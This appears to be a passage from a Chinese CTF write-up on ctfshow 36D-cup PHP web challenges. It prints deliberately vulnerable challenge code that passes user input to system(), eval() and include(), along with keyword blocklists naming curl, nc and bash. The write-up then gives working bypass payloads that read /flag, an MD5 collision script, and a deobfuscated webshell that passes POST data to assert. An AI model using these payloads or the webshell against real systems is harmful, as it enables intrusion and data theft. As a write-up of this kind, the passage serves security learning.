class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    $numPositve = intval($num);</span><br><span class="line">    $numReverse = intval(strrev($num));</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[^0-9.-]/'</span>, $num)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"非洲欢迎你1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($numPositve &lt;= <span class="number">-999999999999999999</span> || $numPositve &gt;= <span class="number">999999999999999999</span>) &#123; <span class="comment">//在64位系统中 intval()的上限不是2147483647 省省吧</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"非洲欢迎你2"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"金钱解决不了穷人的本质问题"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'md5'</span>]))&#123;</span><br><span class="line">    $md5=$_GET[<span class="string">'md5'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($md5==md5(md5($md5)))</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'get_flag'</span>]))&#123;</span><br><span class="line">    $get_flag = $_GET[<span class="string">'get_flag'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">" "</span>))&#123;</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"cat"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"more"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"tail"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"less"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"head"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"tac"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"$"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"sort"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"curl"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"nc"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"bash"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"php"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;"</span>;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"快到非洲了"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> 金钱解决不了穷人的本质问题</span><br></pre></td></tr></table></figure>

<p>在本地测试后发现<code>isPalindrome</code>函数的作用：当输入的$str对称时返回true，不对称的时候返回false<br>测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPalindrome</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $len=strlen($str);</span><br><span class="line">    $l=<span class="number">1</span>;</span><br><span class="line">    $k=intval($len/<span class="number">2</span>)+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;$k;$j++)</span><br><span class="line">        <span class="keyword">if</span> (substr($str,$j,<span class="number">1</span>)!=substr($str,$len-$j<span class="number">-1</span>,<span class="number">1</span>)) &#123;</span><br><span class="line">            $l=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'一'</span>.$l;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> ($l==<span class="number">1</span>) <span class="keyword">echo</span> <span class="string">'true'</span>.$l;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">'false'</span>.$l;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">echo</span> isPalindrome($a)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/11/ctfshow36d/1588258144373.png" alt="1588258144373"></p>
<p><img src="/2020/05/11/ctfshow36d/1588258162279.png" alt="1588258162279"></p>
<p>level1中的第二个if限制了输入只能为0-9的数字和<code>.</code> <code>-</code><br>第二个if限制大小<br>第三个if则矛盾了，既要<code>$numPositve === $numReverse</code>对称，又要<code>isPalindrome($num)</code>返回false即不对称<br>测试发现，如果先抛开第一个正则表达式，则后面的可以使用一个对称的数字前面加上一个空格来绕过<br><img src="/2020/05/11/ctfshow36d/1588258712691.png" alt="1588258712691"></p>
<p>但是加上正则后始终绕不过，最后发现当传入111.-111时能绕过，神奇。<br>leve2为md5绕过，传入经过两个编码后还是0e开头的数字即可</p>
<p>使用脚本碰撞</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!python2</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MD5</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(data).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    a = <span class="number">100000000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = <span class="string">'0e'</span> + str(a)</span><br><span class="line">        data_md5 = MD5(MD5(data))</span><br><span class="line">        a = a + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(re.match(<span class="string">'^0e[0-9]&#123;30&#125;'</span>,data_md5)):</span><br><span class="line">            print(data)</span><br><span class="line">            print(data_md5)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span>(a % <span class="number">1000000</span> == <span class="number">0</span>):</span><br><span class="line">            print(a)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>得到</p>
<blockquote>
<p>0e1138100474</p>
</blockquote>
<p><img src="/2020/05/11/ctfshow36d/1588292465031.png" alt="1588292465031"></p>
<p>成功绕过</p>
<p>level3<br>这里过滤了很多关键字，过滤了空格可以使用%09(tab)来绕过，最终payload：</p>
<blockquote>
<p>?num=111.-111&amp;md5=0e1138100474&amp;get_flag=ca\t%09../../../flag</p>
</blockquote>
<h2 id="朴实无华2"><a href="#朴实无华2" class="headerlink" title="朴实无华2"></a>朴实无华2</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPalindrome</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $len=strlen($str);</span><br><span class="line">    $l=<span class="number">1</span>;</span><br><span class="line">    $k=intval($len/<span class="number">2</span>)+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;$k;$j++)</span><br><span class="line">        <span class="keyword">if</span> (substr($str,$j,<span class="number">1</span>)!=substr($str,$len-$j<span class="number">-1</span>,<span class="number">1</span>)) &#123;</span><br><span class="line">            $l=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> ($l==<span class="number">1</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    $numPositve = intval($num);</span><br><span class="line">    $numReverse = intval(strrev($num));</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[^0-9.]/'</span>, $num)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"非洲欢迎你1"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (preg_match_all(<span class="string">"/\./"</span>, $num) &gt; <span class="number">1</span>) || (preg_match_all(<span class="string">"/\-/"</span>, $num) &gt; <span class="number">1</span>) || (preg_match_all(<span class="string">"/\-/"</span>, $num)==<span class="number">1</span> &amp;&amp; !preg_match(<span class="string">'/^[-]/'</span>, $num))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"没有这样的数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($num != $numPositve) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($numPositve &lt;= <span class="number">-999999999999999999</span> || $numPositve &gt;= <span class="number">999999999999999999</span>) &#123; <span class="comment">//在64位系统中 intval()的上限不是2147483647 省省吧</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"非洲欢迎你2"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"金钱解决不了穷人的本质问题"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'md5'</span>]))&#123;</span><br><span class="line">    $md5=$_GET[<span class="string">'md5'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($md5==md5(md5($md5)))</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'get_flag'</span>]))&#123;</span><br><span class="line">    $get_flag = $_GET[<span class="string">'get_flag'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">" "</span>))&#123;</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"cat"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"more"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"tail"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"less"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"head"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"tac"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"sort"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"nl"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"$"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"curl"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"bash"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"nc"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"php"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/['\*\"[?]/"</span>, $get_flag)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'非预期修复*2'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;"</span>;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"快到非洲了"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">非洲欢迎你<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>出题人对题目做了稍微的修改<br>level1<br>相比前一题去掉了<code>-</code>,并且限制了<code>.</code>的输入个数，并且intval($num)==$mun。<br>这里我使用<code>00.</code>成功绕过。<br>level2<br>这里没变，使用md5=0e1138100474绕过<br>level3<br>这里过滤的有点多了<br>但是尝试了一个之后发现可以使用<code>ca\t%09flag.p\h\p</code>来绕过php<br><img src="/2020/05/11/ctfshow36d/1588391093482.png" alt="1588391093482"></p>
<h2 id="WEB-你取吧"><a href="#WEB-你取吧" class="headerlink" title="WEB_你取吧"></a>WEB_你取吧</h2><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$hint=file_get_contents(<span class="string">'php://filter/read=convert.base64-encode/resource=hhh.php'</span>);</span><br><span class="line">$code=$_REQUEST[<span class="string">'code'</span>];</span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'l'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'\~'</span>,<span class="string">'\^'</span>);</span><br><span class="line">$blacklist = array_merge($_);</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'nonono'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"echo($code);"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里$_[0]就是a<br>根据题目意思需要我们通过数组的形式构造出字符串,题目应该是读取$hint<br>由于不知道怎么构造，所以先本地测试了一下，这里本地构造system(‘dir’)<br><img src="/2020/05/11/ctfshow36d/1588492207585.png" alt="1588492207585"></p>
<p>这样直接输出没问题，但是通过url传参便出现了问题<br><img src="/2020/05/11/ctfshow36d/1588492713415.png" alt="1588492713415"></p>
<p>本来想使用<code>.</code>来连接，但是那样便不能执行<br>接着测试了一下，发现不是<code>.</code>的问题，猜测应该是括号的问题<br><img src="/2020/05/11/ctfshow36d/1588512783949.png" alt="1588512783949"></p>
<p>问了一个大佬后发现前面的函数名也要加上括号</p>
<figure class="highlight scheme"><table><tr><td class="code"><pre><span class="line">(<span class="name">$_</span>[<span class="name">15</span>].$_[<span class="name">7</span>].$_[<span class="name">15</span>].$_[<span class="name">8</span>].$_[<span class="name">12</span>].$_[<span class="name">5</span>].$_[<span class="name">14</span>])()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/11/ctfshow36d/1588516368081.png" alt="1588516368081"></p>
<figure class="highlight scheme"><table><tr><td class="code"><pre><span class="line">(<span class="name">$_</span>[<span class="name">18</span>].$_[<span class="name">24</span>].$_[<span class="name">18</span>].$_[<span class="name">19</span>].$_[<span class="name">4</span>].$_[<span class="name">11</span>])(<span class="name">$_</span>[<span class="name">22</span>].$_[<span class="name">7</span>].$_[<span class="name">14</span>].$_[<span class="name">0</span>].$_[<span class="name">11</span>].$_[<span class="name">8</span>])</span><br></pre></td></tr></table></figure>

<p>最后构造$hint</p>
<blockquote>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$&#123;</span><span class="variable">$_</span>[<span class="number">7</span>].<span class="variable">$_</span>[<span class="number">8</span>].<span class="variable">$_</span>[<span class="number">12</span>].<span class="variable">$_</span>[<span class="number">19</span>]&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>解码得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"/phpjiami.zip\n/hint.php"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>将其下载下来后有混淆，使用php反混淆工具解密，发现shell，在hint.php链接获得flag<br><a href="https://www.unphp.net/" target="_blank" rel="noopener">https://www.unphp.net/</a><br>解密后为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="string">"//Encode by  phpjiami.com,Free user."</span>); <span class="meta">?&gt;</span><span class="meta">&lt;?php</span></span><br><span class="line">$ch = explode(<span class="string">"."</span>,<span class="string">"hello.ass.world.er.rt.e.saucerman"</span>);</span><br><span class="line">$c = $ch[<span class="number">1</span>].$ch[<span class="number">5</span>].$ch[<span class="number">4</span>]; </span><br><span class="line">@$c($_POST[<span class="number">7</span><span class="number">-1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br></pre></td></tr></table></figure>

<p>解密脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($data, $key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data_1 = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($data); $i++) &#123;</span><br><span class="line">        $ch = ord($data[$i]);</span><br><span class="line">        <span class="keyword">if</span> ($ch &lt; <span class="number">245</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($ch &gt; <span class="number">136</span>) &#123;</span><br><span class="line">                $data_1 .= chr($ch / <span class="number">2</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $data_1 .= $data[$i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $data_1 = base64_decode($data_1);</span><br><span class="line">    $key = md5($key);</span><br><span class="line">    $j = $ctrmax = <span class="number">32</span>;</span><br><span class="line">    $data_2 = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($data_1); $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($j &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            $j = $ctrmax;</span><br><span class="line">        &#125;</span><br><span class="line">        $j--;</span><br><span class="line">        $data_2 .=  $data_1[$i] ^ $key[$j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $data_2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find_data</span><span class="params">($code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $code_end = strrpos($code, <span class="string">'?&gt;'</span>);</span><br><span class="line">    <span class="keyword">if</span> (!$code_end) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $data_start = $code_end + <span class="number">2</span>;</span><br><span class="line">    $data = substr($code, $data_start, <span class="number">-46</span>);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find_key</span><span class="params">($code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// $v1 = $v2('bWQ1');</span></span><br><span class="line">    <span class="comment">// $key1 = $v1('??????');</span></span><br><span class="line">    $pos1 = strpos($code, <span class="string">"('"</span> . preg_quote(base64_encode(<span class="string">'md5'</span>)) . <span class="string">"');"</span>);</span><br><span class="line">    $pos2 = strrpos(substr($code, <span class="number">0</span>, $pos1), <span class="string">'$'</span>);</span><br><span class="line">    $pos3 = strrpos(substr($code, <span class="number">0</span>, $pos2), <span class="string">'$'</span>);</span><br><span class="line">    $var_name = substr($code, $pos3, $pos2 - $pos3 - <span class="number">1</span>);</span><br><span class="line">    $pos4 = strpos($code, $var_name, $pos1);</span><br><span class="line">    $pos5 = strpos($code, <span class="string">"('"</span>, $pos4);</span><br><span class="line">    $pos6 = strpos($code, <span class="string">"')"</span>, $pos4);</span><br><span class="line">    $key = substr($code, $pos5 + <span class="number">2</span>, $pos6 - $pos5 - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> $key;</span><br><span class="line">&#125;</span><br><span class="line">$input_file = $argv[<span class="number">1</span>];</span><br><span class="line">$output_file = $argv[<span class="number">1</span>] . <span class="string">'.decrypted.php'</span>;</span><br><span class="line">$code = file_get_contents($input_file);</span><br><span class="line">$data = find_data($code);</span><br><span class="line"><span class="keyword">if</span> (!$code) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'未找到加密数据'</span>, PHP_EOL;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$key = find_key($code);</span><br><span class="line"><span class="keyword">if</span> (!$key) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'未找到秘钥'</span>, PHP_EOL;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$decrypted = decrypt($data, $key);</span><br><span class="line">$uncompressed = gzuncompress($decrypted);</span><br><span class="line"><span class="comment">// 由于可以不勾选代码压缩的选项，所以这里判断一下是否解压成功，解压失败就是没压缩</span></span><br><span class="line"><span class="keyword">if</span> ($uncompressed) &#123;</span><br><span class="line">    $decrypted = str_rot13($uncompressed);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $decrypted = str_rot13($decrypted);</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($output_file, $decrypted);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'解密后文件已写入到 '</span>, $output_file, PHP_EOL;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/11/ctfshow36d/1588752034343.png" alt="1588752034343"></p>
<p><strong>还可以使用chr()直接拼接</strong></p>
<blockquote>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">($_1=$_[2].$_[7].$_[17]).($___=$_1(<span class="number">99</span>).$_1(<span class="number">97</span>).$_1(<span class="number">116</span>).$_1(<span class="number">32</span>).$_1(<span class="number">47</span>).$_1(<span class="number">102</span>).$_1(<span class="number">108</span>).$_1(<span class="number">97</span>).$_1(<span class="number">103</span>)).($_2=$_1(<span class="number">115</span>).$_1(<span class="number">121</span>).$_1(<span class="number">115</span>).$_1(<span class="number">116</span>).$_1(<span class="number">101</span>).$_1(<span class="number">109</span>)).</span><br><span class="line">($_2($___))</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/05/11/ctfshow36d/1588736721594.png" alt="1588736721594"></p>
<p><strong>P神的无数字字母getshell</strong></p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">code=%27123%27);$_=[];$_=@%<span class="number">22</span>$_%22;$_=$_[%27!%27==%27@%<span class="number">27</spanamp;_=<span class="keyword">system</span>(<span class="string">'cat%20/flag'</span>);</span><br></pre></td></tr></table></figure>

<p>还可以使用三元运算符构造hint<br>参考<a href="http://wh1sper.cn/ctfshow-36d%e6%9d%af/" target="_blank" rel="noopener">CTFshow 36D杯</a></p>
<h2 id="WEB-ALL-INFO-U-WANT"><a href="#WEB-ALL-INFO-U-WANT" class="headerlink" title="WEB_ALL_INFO_U_WANT"></a>WEB_ALL_INFO_U_WANT</h2><p>查看源码提示使用扫描器，但是扫描器扫不动。盲猜index.php.bak<br>得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">visit all_info_u_want.php <span class="keyword">and</span> you will get all information you want</span><br><span class="line"></span><br><span class="line">= =Thinking that it may be difficult, i decided to show you the source code:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//give you all information you want</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'all_info_i_want'</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    $file = <span class="string">"/var/www/html/"</span> . $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="comment">//really baby include</span></span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">really really really 